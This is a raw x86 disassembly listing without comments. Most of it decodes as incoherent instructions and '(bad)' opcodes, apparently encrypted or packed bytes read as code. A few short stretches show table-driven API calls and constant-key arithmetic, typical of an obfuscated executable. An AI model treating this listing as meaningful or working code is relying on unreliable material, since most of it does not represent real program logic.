  40496c:	adc    BYTE PTR [edi+0x70],bl
  40496f:	shl    BYTE PTR [ecx-0x1b],0xfc
  404973:	retf   
  404974:	adc    al,0xf6
  404976:	jbe    0x4049da
  404978:	cmp    al,0x94
  40497a:	mov    ds:0x6abb52e,al
  40497f:	mov    ch,0x6c
  404981:	pop    ecx
  404982:	lea    ebx,[ebp+0x6ed36742]
  404988:	inc    ecx
  404989:	nop
  40498a:	div    ebp
  40498c:	lds    eax,FWORD PTR [ebx]
  40498e:	(bad)  
  40498f:	xchg   esi,eax
  404990:	test   eax,0x8402724d
  404995:	xor    eax,0xf6c1842f
  40499a:	mov    esi,0xc86b642a
  40499f:	lds    ecx,FWORD PTR [ebx+edi*4+0x665df9f]
  4049a6:	lods   al,BYTE PTR ds:[esi]
  4049a7:	(bad)  
  4049a8:	aad    0x44
  4049aa:	jae    0x404993
  4049ac:	push   eax
  4049ad:	mul    DWORD PTR [edi-0x1f95e9ad]
  4049b3:	fwait
  4049b4:	push   0x7ff37398
  4049b9:	ret    0x3bed
  4049bc:	cmp    esp,ebp
  4049be:	mov    edx,0x49c2b0f0
  4049c3:	xor    eax,0x6c5ac2f1
  4049c8:	inc    edi
  4049c9:	mov    ch,0x7d
  4049cb:	retf   
  4049cc:	daa    
  4049cd:	dec    ebx
  4049ce:	mov    dh,0xb1
  4049d0:	leave  
  4049d1:	push   ss
  4049d2:	jecxz  0x404a38
  4049d4:	repz adc DWORD PTR [ebx+eiz*2],edi
  4049d8:	ins    BYTE PTR es:[edi],dx
  4049d9:	mov    ?,eax
  4049db:	cmc    
  4049dc:	in     al,dx
  4049dd:	and    eax,0x15c2cee0
  4049e2:	div    BYTE PTR [ecx+0x48]
  4049e5:	mov    edx,0x4787273
  4049ea:	pop    edx
  4049eb:	sub    eax,0xaaef38d4
  4049f0:	sub    cl,0x8b
  4049f3:	adc    edi,DWORD PTR ds:0xe904e5c8
  4049f9:	int    0x6f
  4049fb:	sbb    al,0x3a
  4049fd:	imul   ebx,DWORD PTR [ebx+0xe1a2965],0x156eecb4
  404a07:	jbe    0x404a0c
  404a09:	cwde   
  404a0a:	lods   eax,DWORD PTR ds:[esi]
  404a0b:	xchg   ah,bl
  404a0d:	pop    ds
  404a0e:	sti    
  404a0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404a10:	repz xchg esp,eax
  404a12:	cmp    BYTE PTR [ecx+0x7fff59ce],0x97
  404a19:	cwde   
  404a1a:	and    DWORD PTR [ecx-0x52],edx
  404a1d:	aas    
  404a1e:	ds shr ah,1
  404a21:	xor    esi,DWORD PTR [edi+0x74]
  404a24:	shl    DWORD PTR [eax+eax*4+0x7e6a750],cl
  404a2b:	int    0x5d
  404a2d:	stos   BYTE PTR es:[edi],al
  404a2e:	test   al,0x5b
  404a30:	push   ds
  404a31:	test   DWORD PTR [bp+di-0x54],esp
  404a35:	arpl   WORD PTR [ebx+0x4276f078],dx
  404a3b:	cwde   
  404a3c:	idiv   BYTE PTR es:[edi]
  404a3f:	xchg   esi,eax
  404a40:	jmp    0x4f3a:0x24eb2994
  404a47:	ja     0x4049d8
  404a49:	and    dh,bl
  404a4b:	imul   ebp,DWORD PTR [edx+0x490ef427],0xb7d8ca9
  404a55:	xchg   al,dh
  404a57:	mov    cl,0x56
  404a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a5a:	jp     0x404ac0
  404a5c:	or     eax,0xf15b7eb2
  404a61:	xchg   ebx,eax
  404a62:	jne    0x404a14
  404a64:	push   0xb5371007
  404a69:	popa   
  404a6a:	push   ss
  404a6b:	push   ebx
  404a6c:	inc    esi
  404a6d:	xor    eax,0x322d06fd
  404a72:	inc    edx
  404a73:	icebp  
  404a74:	test   BYTE PTR [edi+ebp*2],ch
  404a77:	dec    edi
  404a78:	jmp    0xc9c45f83
  404a7d:	mov    eax,ds:0x13d0c36c
  404a82:	mov    ss,WORD PTR [esi+0x403df0e9]
  404a88:	outs   dx,BYTE PTR ds:[esi]
  404a89:	in     eax,dx
  404a8a:	mov    ds:0xa0981f89,al
  404a8f:	mov    bh,0x3b
  404a91:	aam    0x79
  404a93:	aam    0x3f
  404a95:	jge    0x404aa8
  404a97:	mov    ecx,0x5ca2f5c0
  404a9c:	mov    al,0x98
  404a9e:	retf   
  404a9f:	test   eax,0x9468938d
  404aa4:	inc    edi
  404aa5:	inc    edi
  404aa6:	sbb    ebp,DWORD PTR [edx+0x4146d2b7]
  404aac:	(bad)  
  404aad:	sti    
  404aae:	(bad)  
  404ab0:	(bad)  
  404ab1:	inc    DWORD PTR [esi+0x4d]
  404ab4:	(bad)  
  404ab6:	addr16 loope 0x404a59
  404ab9:	ret    
  404aba:	add    edx,DWORD PTR [ecx+edx*4+0x740625ab]
  404ac1:	or     BYTE PTR [eax+0x31],al
  404ac4:	inc    ebx
  404ac5:	add    al,0xe2
  404ac7:	fwait
  404ac8:	and    BYTE PTR [ebp+edi*1-0x2],al
  404acc:	inc    ecx
  404acd:	push   ss
  404ace:	and    al,ch
  404ad0:	mov    dh,0xb
  404ad2:	and    esp,DWORD PTR [ebx+0x3c]
  404ad5:	(bad)  
  404ad6:	and    dh,BYTE PTR [edi+0x2e]
  404ad9:	loope  0x404b4e
  404adb:	(bad)  
  404adc:	jb     0x404ae5
  404ade:	jmp    0x8aa3e6a1
  404ae3:	outs   dx,BYTE PTR ds:[esi]
  404ae4:	mov    esp,0x9a92b99b
  404ae9:	pop    edi
  404aea:	push   0x1c
  404aec:	clc    
  404aed:	adc    ah,BYTE PTR [edx-0x2ae6c579]
  404af3:	dec    edi
  404af4:	shr    BYTE PTR [ecx-0x3c9d3ce1],0x61
  404afb:	mov    al,cl
  404afd:	xchg   ebx,eax
  404afe:	mov    dh,0x31
  404b00:	ror    cl,cl
  404b02:	dec    esi
  404b03:	ret    
  404b04:	dec    esp
  404b05:	push   es
  404b06:	fucom  st(4)
  404b08:	mov    ds:0xd9307418,eax
  404b0d:	and    edx,DWORD PTR [ecx]
  404b0f:	out    dx,al
  404b10:	mov    al,ds:0x667b34f2
  404b15:	sub    al,0x6f
  404b17:	mov    WORD PTR [eax+ebx*2+0x4b5723dc],fs
  404b1e:	push   ebp
  404b1f:	outs   dx,BYTE PTR ds:[esi]
  404b20:	cmp    ebx,DWORD PTR [eax]
  404b22:	and    al,BYTE PTR cs:[bp+si+0x7d3a]
  404b28:	jae    0x404abd
  404b2a:	push   ss
  404b2b:	not    BYTE PTR [edi+0x4fb39f79]
  404b31:	stos   DWORD PTR es:[edi],eax
  404b32:	sub    DWORD PTR [ebx+0x77703832],ebp
  404b38:	div    DWORD PTR [edx+0x42]
  404b3b:	jnp    0x404b24
  404b3d:	lock xchg ebx,eax
  404b3f:	adc    edx,DWORD PTR [eax]
  404b41:	mov    esp,0x3dc6beb1
  404b46:	adc    DWORD PTR [ecx+0x3a],ebp
  404b49:	mov    bl,0xdd
  404b4b:	mov    edi,0xf78ce3aa
  404b50:	inc    ebx
  404b51:	(bad)  
  404b52:	jecxz  0x404b20
  404b54:	ja     0x404ad7
  404b56:	dec    ecx
  404b57:	adc    DWORD PTR [eax+0x218974da],eax
  404b5d:	push   0x57
  404b5f:	jae    0x404baa
  404b61:	jl     0x404b58
  404b63:	jle    0x404b23
  404b65:	jmp    0x404b7e
  404b67:	push   ecx
  404b68:	inc    eax
  404b69:	sbb    eax,0x136723d1
  404b6e:	jg     0x404b51
  404b70:	addr16 hlt 
  404b72:	fist   WORD PTR [eax+eax*4+0x1f]
  404b76:	inc    esi
  404b77:	js     0x404b8f
  404b79:	scas   al,BYTE PTR es:[edi]
  404b7a:	pushf  
  404b7b:	cld    
  404b7c:	add    dl,0xb3
  404b7f:	inc    eax
  404b80:	fdiv   st,st(4)
  404b82:	and    al,BYTE PTR [edi-0x114d2a6f]
  404b88:	js     0x404b1f
  404b8a:	push   0x7
  404b8c:	dec    esp
  404b8d:	addr16 mov ?,esi
  404b90:	and    eax,0xfa469e92
  404b95:	imul   ecx,esi,0xf47014d8
  404b9b:	cli    
  404b9c:	push   ss
  404b9d:	mov    eax,ds:0x6ccceffe
  404ba2:	fbstp  TBYTE PTR [edi]
  404ba4:	mov    ebp,0xa7e2eeeb
  404ba9:	xchg   BYTE PTR [esi],bh
  404bab:	push   ebp
  404bac:	cmp    al,0xb2
  404bae:	lock jmp 0xffd9:0x4fe18ed6
  404bb6:	paddsb mm5,mm3
  404bb9:	pop    edi
  404bba:	mov    ebx,0xf3b3a6ce
  404bbf:	inc    eax
  404bc0:	(bad)  
  404bc1:	cs (bad) 
  404bc3:	fidiv  WORD PTR [ebx-0x7de39a02]
  404bc9:	mov    bh,0x11
  404bcb:	jecxz  0x404bd3
  404bcd:	sbb    ebp,ebx
  404bcf:	loop   0x404be1
  404bd1:	and    eax,0xba265af
  404bd6:	out    0x45,eax
  404bd8:	adc    DWORD PTR [ebx],esi
  404bda:	mov    ebp,0x3352c279
  404bdf:	int    0x88
  404be1:	mov    ebp,0x93f037f8
  404be6:	cmp    al,0xe9
  404be8:	dec    eax
  404be9:	(bad)  
  404bea:	fsub   QWORD PTR [edx-0x8]
  404bed:	push   ss
  404bee:	loope  0x404bdf
  404bf0:	pinsrw mm3,WORD PTR [ecx],0x49
  404bf4:	lahf   
  404bf5:	mov    bl,0x43
  404bf7:	mov    esp,0xfccb6e4
  404bfc:	adc    BYTE PTR [ecx],bh
  404bfe:	out    dx,al
  404bff:	scas   al,BYTE PTR es:[edi]
  404c00:	xor    esi,DWORD PTR [ebx-0x4a]
  404c03:	mov    ecx,0xf688244d
  404c08:	pop    ebp
  404c09:	push   cs
  404c0a:	imul   edx,DWORD PTR [edi],0x3ba2b567
  404c10:	inc    esi
  404c11:	stos   BYTE PTR es:[edi],al
  404c12:	fist   DWORD PTR [ebx-0x57ec5286]
  404c18:	(bad)  
  404c19:	fwait
  404c1a:	(bad)  
  404c1b:	ja     0x404c04
  404c1d:	inc    ebp
  404c1e:	das    
  404c1f:	cmp    al,0x6d
  404c21:	jns    0x404c00
  404c23:	in     al,0x22
  404c25:	icebp  
  404c26:	mul    DWORD PTR [ebx]
  404c28:	xor    ecx,DWORD PTR [ebp-0x4d]
  404c2b:	mov    esi,0xb6230d5b
  404c30:	nop
  404c31:	cmp    al,0x81
  404c33:	jb     0x404c8f
  404c35:	es in  al,dx
  404c37:	ret    0xca1e
  404c3a:	pop    ecx
  404c3b:	arpl   WORD PTR [ebx+0x34cdc485],bx
  404c41:	out    dx,eax
  404c42:	or     BYTE PTR [ecx+0x42],dl
  404c45:	into   
  404c46:	inc    ebx
  404c47:	sub    ebx,DWORD PTR [bx+di]
  404c4a:	adc    ecx,ebp
  404c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c4d:	or     ah,BYTE PTR [ebx+0x5407d25f]
  404c53:	cmp    BYTE PTR [esi+0x3b7e394a],0xd8
  404c5a:	sbb    cl,BYTE PTR [ebx+0x322cec55]
  404c60:	shl    esp,1
  404c62:	pusha  
  404c63:	popa   
  404c64:	fidivr WORD PTR [edi+0x1f]
  404c67:	push   esi
  404c68:	into   
  404c69:	jno    0x404c0b
  404c6b:	loop   0x404ca7
  404c6d:	int3   
  404c6e:	jb     0x404ca4
  404c70:	jnp    0x404cbe
  404c72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c73:	lods   al,BYTE PTR ds:[esi]
  404c74:	(bad)  
  404c75:	or     bl,BYTE PTR [ecx-0x18f39fd0]
  404c7b:	(bad)  
  404c7c:	push   0x4af7d6e7
  404c81:	sbb    al,bh
  404c83:	and    al,0xbc
  404c85:	je     0x404c62
  404c87:	jmp    0x230a62d3
  404c8c:	and    al,0x7c
  404c8e:	mov    al,ds:0x24ce586b
  404c93:	dec    esp
  404c94:	mov    ah,0x83
  404c96:	sbb    BYTE PTR [eax-0x30],0x53
  404c9a:	and    ecx,DWORD PTR [ebx+0x2ba5d73]
  404ca0:	push   es
  404ca1:	sbb    DWORD PTR [eax+0xe],edi
  404ca4:	push   0x567083c3
  404ca9:	in     eax,dx
  404caa:	fnstcw WORD PTR [ebx-0x59]
  404cad:	inc    ebx
  404cae:	add    al,ch
  404cb0:	mov    bl,0xf4
  404cb2:	call   0x34c08b2b
  404cb7:	pop    ecx
  404cb8:	dec    ecx
  404cb9:	cld    
  404cba:	jb     0x404d2c
  404cbc:	and    al,0xf8
  404cbe:	inc    ebp
  404cbf:	mov    ecx,0x5be1a8f4
  404cc4:	aaa    
  404cc5:	mov    al,0xe8
  404cc7:	pop    edx
  404cc8:	or     al,0xb9
  404cca:	cmp    bl,BYTE PTR [ebx]
  404ccc:	test   BYTE PTR [eax],bl
  404cce:	setb   BYTE PTR [esi+0x59bb9f7c]
  404cd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cd6:	mov    ecx,0x8602a3a6
  404cdb:	pop    eax
  404cdc:	jmp    0xeb3f9a3
  404ce1:	xor    DWORD PTR [esi+ebp*8],edi
  404ce4:	js     0x404cef
  404ce6:	outs   dx,DWORD PTR ds:[esi]
  404ce7:	mul    DWORD PTR [eax+edi*2]
  404cea:	mov    ds:0x5b895ace,al
  404cef:	aad    0x5a
  404cf1:	(bad)  
  404cf2:	cli    
  404cf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404cf4:	cdq    
  404cf5:	cmp    BYTE PTR [ebx-0xd4bfbc9],0x9c
  404cfc:	repnz mov eax,DWORD PTR [ebp-0x14]
  404d00:	add    DWORD PTR [eax],0x705fa8c
  404d06:	mov    eax,DWORD PTR [ebp-0x10]
  404d09:	mov    edx,DWORD PTR [ebp+0x8]
  404d0c:	xor    eax,ecx
  404d0e:	lea    eax,[eax+edx*1+0x327299]
  404d15:	mov    DWORD PTR [ebp+0x8],eax
  404d18:	inc    DWORD PTR [ebp+0xc]
  404d1b:	jmp    0x4040d8
  404d20:	mov    eax,DWORD PTR [ebp-0x10]
  404d23:	xor    eax,ecx
  404d25:	mov    ecx,DWORD PTR [ebp+0x10]
  404d28:	add    eax,esi
  404d2a:	mov    DWORD PTR [ecx],eax
  404d2c:	pop    esi
  404d2d:	leave  
  404d2e:	ret    0xc
  404d31:	push   ebp
  404d32:	mov    ebp,esp
  404d34:	push   ecx
  404d35:	sub    edx,eax
  404d37:	jmp    0x404f34
  404d3c:	pop    edi
  404d3d:	mov    ebx,cs
  404d3f:	and    ebp,edi
  404d41:	jno    0x404dc0
  404d43:	dec    esp
  404d44:	call   0xdeaa7d7b
  404d49:	clc    
  404d4a:	or     BYTE PTR [esi],dh
  404d4c:	sbb    ebp,DWORD PTR [edi]
  404d4e:	jle    0x404dce
  404d50:	pop    esi
  404d51:	jg     0x404dd1
  404d53:	jle    0x404da7
  404d55:	mov    ds:0xb517e92,al
  404d5a:	cs mov bh,0x95
  404d5d:	out    0xe,eax
  404d5f:	fstp   TBYTE PTR [ecx]
  404d61:	mov    esp,0x7b4da6ff
  404d67:	mov    eax,ds:0xd5f83a66
  404d6c:	and    eax,0xe0e26137
  404d71:	jb     0x404dbc
  404d73:	out    dx,al
  404d74:	push   ebx
  404d75:	aaa    
  404d76:	sub    ah,BYTE PTR ds:0xade3892e
  404d7c:	jb     0x404d3c
  404d7e:	(bad)  
  404d7f:	mov    dl,0x1a
  404d81:	mov    ebp,0x70a146e1
  404d86:	add    BYTE PTR [ebx-0x6c],ah
  404d89:	data16 arpl sp,cx
  404d8c:	(bad)  
  404d8d:	sub    dl,BYTE PTR [ecx-0x36aaad2b]
  404d93:	sbb    al,0x77
  404d95:	pusha  
  404d96:	dec    edi
  404d97:	cmp    al,0xbd
  404d99:	test   DWORD PTR [edi],ecx
  404d9b:	inc    ecx
  404d9c:	out    dx,eax
  404d9d:	cmp    al,0x88
  404d9f:	sbb    cl,BYTE PTR [edi+0x367d5da0]
  404da5:	call   0x279815e7
  404daa:	jecxz  0x404dc9
  404dac:	add    eax,0xded2f42e
  404db1:	retf   
  404db2:	dec    ebx
  404db3:	and    edx,DWORD PTR [ebx]
  404db5:	inc    esi
  404db6:	mov    bh,0x48
  404db8:	xlat   BYTE PTR ds:[ebx]
  404db9:	sbb    ebx,DWORD PTR [ecx+0x691245c7]
  404dbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404dc0:	fwait
  404dc1:	push   es
  404dc2:	(bad)  
  404dc3:	sub    al,0x9e
  404dc5:	cmp    al,0x43
  404dc7:	xor    BYTE PTR [eax],ah
  404dc9:	cmp    BYTE PTR [ebx+0x21be4f5a],0xfd
  404dd0:	inc    edx
  404dd1:	push   ebx
  404dd2:	enter  0xdd5b,0xb7
  404dd6:	cld    
  404dd7:	scas   eax,DWORD PTR es:[edi]
  404dd8:	gs push 0x36
  404ddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404ddc:	test   edi,eax
  404dde:	cmp    esp,DWORD PTR [eax+edi*8+0x207de485]
  404de5:	daa    
  404de6:	sti    
  404de7:	push   esi
  404de8:	xor    DWORD PTR [ecx],edx
  404dea:	jecxz  0x404dd2
  404dec:	push   esp
  404ded:	xor    BYTE PTR ss:[ecx],al
  404df0:	mov    esp,?
  404df2:	sub    edx,DWORD PTR [ebx-0x49074663]
  404df8:	test   DWORD PTR [ebx-0x74f02b77],eax
  404dfe:	nop
  404dff:	pop    eax
  404e00:	(bad)  [edx]
  404e02:	xor    BYTE PTR [edi],al
  404e04:	dec    ecx
  404e05:	or     al,0x76
  404e07:	xchg   ebp,eax
  404e08:	aam    0xba
  404e0a:	cld    
  404e0b:	mov    bl,bh
  404e0d:	xor    ebx,DWORD PTR [eax]
  404e0f:	hlt    
  404e10:	(bad)  
  404e12:	add    BYTE PTR [edx-0x1f41bc6c],dh
  404e18:	adc    ebp,DWORD PTR [ebp-0x5c]
  404e1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e1c:	xor    eax,0xa9a11496
  404e21:	outs   dx,BYTE PTR ds:[esi]
  404e22:	or     ch,bl
  404e24:	inc    esi
  404e25:	out    0x90,eax
  404e27:	imul   ebx,DWORD PTR [ebx],0x4e
  404e2a:	xor    al,0xe2
  404e2c:	sahf   
  404e2d:	fldcw  WORD PTR [edi+0x1230c245]
  404e33:	ja     0x404ded
  404e35:	ss pop es
  404e37:	jge    0x404e96
  404e39:	inc    ebx
  404e3a:	push   ecx
  404e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3c:	pop    edi
  404e3d:	popa   
  404e3e:	or     esp,ebx
  404e40:	xlat   BYTE PTR ds:[ebx]
  404e41:	jnp    0x404ead
  404e43:	jno    0x404e17
  404e45:	adc    al,0xd4
  404e47:	(bad)  
  404e48:	nop
  404e49:	jmp    0xc2ab:0x7d3ee1df
  404e50:	(bad)  
  404e51:	cmp    ebp,DWORD PTR [eax-0x32]
  404e54:	dec    ebp
  404e55:	ins    DWORD PTR es:[edi],dx
  404e56:	lds    edx,FWORD PTR [ecx]
  404e58:	xor    DWORD PTR [esi-0x62],ecx
  404e5b:	mov    dl,ch
  404e5d:	ins    BYTE PTR es:[edi],dx
  404e5e:	mov    ecx,0x393c5d9e
  404e63:	loopne 0x404e87
  404e65:	loope  0x404e56
  404e67:	shl    ebp,cl
  404e69:	adc    eax,0xa044d022
  404e6e:	push   edx
  404e6f:	fmul   QWORD PTR [ebx-0x6f]
  404e72:	cmp    eax,0x4cb515a0
  404e77:	adc    eax,0x6ed1dad2
  404e7c:	ins    DWORD PTR es:[edi],dx
  404e7d:	xchg   esi,eax
  404e7e:	jle    0x404eea
  404e80:	xlat   BYTE PTR ds:[ebx]
  404e81:	in     al,0xaf
  404e83:	arpl   WORD PTR [ecx+0x1098175],cx
  404e89:	pop    esp
  404e8a:	or     ebp,DWORD PTR [eax]
  404e8c:	aaa    
  404e8d:	dec    ebx
  404e8e:	sbb    al,0xaa
  404e90:	mov    bh,0xe0
  404e92:	leave  
  404e93:	add    eax,0x25486110
  404e98:	dec    edx
  404e99:	xchg   esp,eax
  404e9a:	addr16 call 0xcc34:0x2dbbd7a7
  404ea2:	xor    al,0x6d
  404ea4:	jmp    0x1269:0x9033f220
  404eab:	pop    ss
  404eac:	pushf  
  404ead:	adc    eax,0x95facba3
  404eb2:	fld    TBYTE PTR [esi]
  404eb4:	jae    0x404e3d
  404eb6:	fwait
  404eb7:	sub    dh,BYTE PTR [edi]
  404eb9:	add    al,0xcf
  404ebb:	out    dx,al
  404ebc:	repz jmp 0x72ba9168
  404ec2:	cld    
  404ec3:	pop    eax
  404ec4:	xor    dl,dl
  404ec6:	cmp    al,0x7d
  404ec8:	xor    al,0xb8
  404eca:	shl    bl,0x18
  404ecd:	dec    ecx
  404ece:	call   0x57600319
  404ed3:	mov    dh,0x15
  404ed5:	(bad)  
  404ed7:	xchg   DWORD PTR [esi-0x6f],eax
  404eda:	daa    
  404edb:	clc    
  404edc:	dec    ebp
  404edd:	pushf  
  404ede:	cli    
  404edf:	or     ah,0x7
  404ee2:	popa   
  404ee3:	inc    eax
  404ee4:	xlat   BYTE PTR ds:[ebx]
  404ee5:	out    dx,al
  404ee6:	push   ss
  404ee7:	adc    ebp,esi
  404ee9:	xchg   esi,eax
  404eea:	jbe    0x404efc
  404eec:	lock sahf 
  404eee:	shl    al,cl
  404ef0:	push   es
  404ef1:	je     0x404e89
  404ef3:	aaa    
  404ef4:	test   eax,0x74b8f7ec
  404ef9:	loopne 0x404eda
  404efb:	add    eax,0xa9726760
  404f00:	mov    eax,ds:0x238f57ff
  404f05:	add    BYTE PTR [edx+0x59],ch
  404f08:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  404f0a:	xchg   cx,ax
  404f0c:	mov    ebx,DWORD PTR [edx+0x10]
  404f0f:	int3   
  404f10:	lods   al,BYTE PTR ds:[esi]
  404f11:	daa    
  404f12:	call   0x3d49:0x9f210cbf
  404f19:	jnp    0x404efd
  404f1b:	scas   eax,DWORD PTR es:[edi]
  404f1c:	in     eax,0x31
  404f1e:	and    dh,dl
  404f20:	jo     0x404f94
  404f22:	mov    ds:0xa3196a19,al
  404f27:	rol    esp,0x19
  404f2a:	sub    BYTE PTR [edi],bh
  404f2c:	ds repnz lahf 
  404f2f:	test   BYTE PTR [ebx+0x510f1685],0xb
  404f36:	adc    eax,0x4344fb
  404f3b:	mov    DWORD PTR [ebp-0x8],0xf89c8536
  404f42:	mov    DWORD PTR ds:0x43458b,0x1c
  404f4c:	cmp    DWORD PTR ds:0x43458b,0x0
  404f53:	je     0x404f94
  404f59:	cmp    DWORD PTR ds:0x43458b,0x21
  404f60:	jne    0x404f84
  404f66:	push   DWORD PTR [ebp-0x24]
  404f69:	push   DWORD PTR [ebp-0x20]
  404f6c:	push   0x26f9
  404f71:	push   0x3d74
  404f76:	push   0x4b4e
  404f7b:	push   DWORD PTR [ebp-0x1c]
  404f7e:	call   DWORD PTR ds:0x413280
  404f84:	mov    eax,ds:0x43458b
  404f89:	dec    eax
  404f8a:	mov    ds:0x43458b,eax
  404f8f:	jmp    0x404f4c
  404f94:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404f9b:	mov    eax,DWORD PTR [ebp-0x4]
  404f9e:	xor    DWORD PTR ds:0x4344f3,ecx
  404fa4:	push   esi
  404fa5:	and    DWORD PTR ds:0x434593,0x0
  404faf:	mov    edx,DWORD PTR ds:0x434593
  404fb5:	inc    edx
  404fb6:	mov    DWORD PTR ds:0x434593,edx
  404fbc:	cmp    DWORD PTR ds:0x434593,0x21
  404fc3:	jne    0x404fe1
  404fc9:	push   0x434749
  404fce:	push   0x4346ce
  404fd3:	push   0x6321
  404fd8:	push   DWORD PTR [ebp-0x10]
  404fdb:	call   DWORD PTR ds:0x4130bc
  404fe1:	cmp    DWORD PTR ds:0x434593,0x19
  404fe8:	jb     0x404faf
  404fee:	inc    ecx
  404fef:	mov    esi,DWORD PTR [ebp-0x8]
  404ff2:	inc    DWORD PTR ds:0x434537
  404ff8:	mov    edx,0x7510851
  404ffd:	xor    eax,edx
  404fff:	xor    esi,edx
  405001:	mov    ecx,0x327299
  405006:	add    esi,ecx
  405008:	xor    DWORD PTR ds:0x434537,0x55d1
  405012:	add    eax,ecx
  405014:	imul   eax,esi
  405017:	mov    esi,DWORD PTR [ebp+0xc]
  40501a:	cmp    esi,eax
  40501c:	jne    0x405038
  405022:	mov    eax,DWORD PTR [ebp-0x4]
  405025:	mov    esi,DWORD PTR [ebp-0x8]
  405028:	xor    eax,edx
  40502a:	xor    esi,edx
  40502c:	add    eax,ecx
  40502e:	add    esi,ecx
  405030:	imul   eax,esi
  405033:	jmp    0x405270
  405038:	mov    eax,DWORD PTR [ebp+0xc]
  40503b:	mov    eax,DWORD PTR [eax+0x78]
  40503e:	jmp    0x40523b
  405043:	imul   esp,DWORD PTR [eax],0x7d571dbe
  405049:	jge    0x4050b7
  40504b:	push   esp
  40504c:	pop    ds
  40504d:	loopne 0x40508f
  40504f:	lahf   
  405050:	clc    
  405051:	and    DWORD PTR ss:[ebx+0x29],edi
  405055:	jle    0x4050d5
  405057:	pop    esi
  405058:	jg     0x4050d8
  40505a:	jle    0x404feb
  40505c:	call   0x23221905
  405061:	int3   
  405062:	nop
  405063:	call   0x949d:0xe4d8f93c
  40506a:	add    ax,0x7416
  40506e:	fmul   st,st(5)
  405070:	pop    ds
  405071:	add    BYTE PTR [ebx],0xf6
  405074:	std    
  405075:	cmp    dl,BYTE PTR [ebx]
  405077:	adc    cl,al
  405079:	inc    ebx
  40507a:	loope  0x404ffe
  40507c:	nop
  40507d:	mov    ebx,DWORD PTR [ebp+0x76bc67f7]
  405083:	sar    DWORD PTR [ebx+0x78],0xdc
  405087:	aad    0xc7
  405089:	sbb    BYTE PTR [ebx+0xc],al
  40508c:	jle    0x405041
  40508e:	xor    ah,BYTE PTR [ebp+0x1a4f2985]
  405094:	or     ch,BYTE PTR ds:0x9549fcd3
  40509a:	add    eax,DWORD PTR [ebp+0x1eef1f92]
  4050a0:	sahf   
  4050a1:	mov    DWORD PTR [esp+edx*8+0x7bcdd1d9],0x9e7b56c9
  4050ac:	test   al,0x86
  4050ae:	inc    esp
  4050af:	push   cs
  4050b0:	cmp    eax,0x448ebc96
  4050b5:	adc    eax,0xc9c5682a
  4050ba:	sbb    cl,BYTE PTR [ebx]
  4050bc:	cmp    BYTE PTR [edx],0xc5
  4050bf:	mov    ah,BYTE PTR [ecx+0x1e0d7ec1]
  4050c5:	loope  0x4050cd
  4050c7:	gs jp  0x40509d
  4050ca:	es stc 
  4050cc:	call   0x4a35:0x8b5e872c
  4050d3:	imul   esi,ebx,0xffffff93
  4050d6:	loope  0x4050f2
  4050d8:	push   0xffffffdf
  4050da:	mov    cl,0x13
  4050dc:	jae    0x405095
  4050de:	call   0x92f01edd
  4050e3:	sbb    bh,BYTE PTR [edx-0x25]
  4050e6:	xchg   edx,eax
  4050e7:	ror    BYTE PTR ss:[ebx],cl
  4050ea:	mov    al,ds:0xd0097622
  4050ef:	call   0x46da83a0
  4050f4:	es scas eax,DWORD PTR es:[edi]
  4050f6:	sti    
  4050f7:	mov    al,0xd9
  4050f9:	sbb    ebx,DWORD PTR ds:0xeedc6181
  4050ff:	xchg   ecx,eax
  405100:	les    edi,FWORD PTR [esi]
  405102:	cdq    
  405103:	call   FWORD PTR [ecx+0x15]
  405106:	lods   al,BYTE PTR ds:[esi]
  405107:	rcr    DWORD PTR [esi+0x65],1
  40510a:	gs addr16 jle 0x40517f
  40510e:	je     0x4050ef
  405110:	add    BYTE PTR gs:[ebx],al
  405113:	andps  xmm4,XMMWORD PTR [edi]
  405116:	outs   dx,DWORD PTR ds:[esi]
  405117:	cmp    al,0xc4
  405119:	mov    edx,0x368568a
  40511e:	inc    esi
  40511f:	mov    ebx,DWORD PTR [eax+0x4b7c3fe7]
  405125:	sahf   
  405126:	jne    0x405195
  405128:	ds nop
  40512a:	xchg   esi,eax
  40512b:	push   edx
  40512c:	sub    al,0x1e
  40512e:	popfw  
  405130:	ss dec ebp
  405132:	fist   WORD PTR [ecx]
  405134:	(bad)  
  405135:	leave  
  405136:	(bad)  [ecx+edi*1+0x6f]
  40513a:	mov    esi,0x64c7aa0a
  40513f:	mov    bh,0x38
  405141:	mov    ah,0xcd
  405143:	xor    eax,0x82ea26d8
  405148:	add    al,0x24
  40514a:	xchg   ebx,eax
  40514b:	xchg   esp,eax
  40514c:	test   al,0x74
  40514e:	and    eax,0xea4acaf0
  405153:	fs xchg edi,eax
  405155:	jmp    0x8c4e:0x3bdf3bcf
  40515c:	idiv   BYTE PTR [ecx+0x67e052ea]
  405162:	ss inc edx
  405164:	mov    ecx,0x9c0e6b18
  405169:	ss sbb al,0x9c
  40516c:	(bad)  
  40516d:	push   0x4b
  40516f:	cmp    eax,0x4336e59b
  405174:	sti    
  405175:	sbb    eax,0xe6e604e5
  40517a:	and    BYTE PTR [esi+0x7f9909c7],cl
  405180:	pop    esp
  405181:	fcomip st,st(2)
  405183:	cmp    BYTE PTR [esi],cl
  405185:	shr    esi,cl
  405187:	pop    es
  405188:	jns    0x405143
  40518a:	jo     0x405181
  40518c:	cmp    BYTE PTR [ebx],al
  40518e:	push   edx
  40518f:	xchg   esp,eax
  405190:	xor    ebx,eax
  405192:	adc    edi,DWORD PTR [esi-0x44]
  405195:	mov    ds:0x34aa8f5c,al
  40519a:	add    DWORD PTR [edi],0x31
  40519d:	(bad)  
  40519e:	xchg   edx,eax
  40519f:	repz jmp 0xdd2a5548
  4051a5:	xlat   BYTE PTR ds:[ebx]
  4051a6:	xor    DWORD PTR [ebp-0x7d],ecx
  4051a9:	sub    DWORD PTR [edi+ebp*1],0x2c7cfda5
